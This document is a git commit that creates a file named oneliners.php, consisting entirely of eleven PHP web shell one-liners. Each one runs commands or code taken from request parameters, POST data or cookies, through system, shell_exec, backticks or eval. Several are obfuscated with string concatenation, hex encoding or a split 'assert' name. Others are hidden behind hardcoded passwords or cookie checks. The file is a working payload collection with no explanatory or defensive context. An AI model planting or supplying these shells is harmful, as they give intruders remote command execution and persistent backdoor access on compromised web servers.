1741296f1c17a80372d684620a319dc5f8d9513a
Krishna <28984639+krishna4moon@users.noreply.github.com>
2026-02-10 22:06:26 +0530

    Create oneliners.php

---
+++ oneliners.php
@@ -0,0 +1,11 @@
+<?php system($_GET['cmd']);?>
+<?php echo shell_exec($_REQUEST['cmd']);?>
+<?= `$_GET[0]` ?>
+<?php if(isset($_GET['c'])){system($_GET['c']);}?>
+<?php $a="s"."y"."s"."t"."e"."m";$a($_POST['x']);?>
+<?php array_map("as"."sert",(array)$_REQUEST['z']);?>
+<?php create_function('',$_GET['f'])();?>
+<?php preg_replace('/.*/e','\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x63\x5d\x29\x3b','');?>
+<?php if(md5($_GET['p'])=='5f4dcc3b5aa765d61d8327deb882cf99'){eval($_POST['c']);}?>
+<?php if($_GET['key']=='admin123'){system($_POST['cmd']);}?>
+<?php if($_COOKIE['auth']=='true')eval($_POST['code']);?>
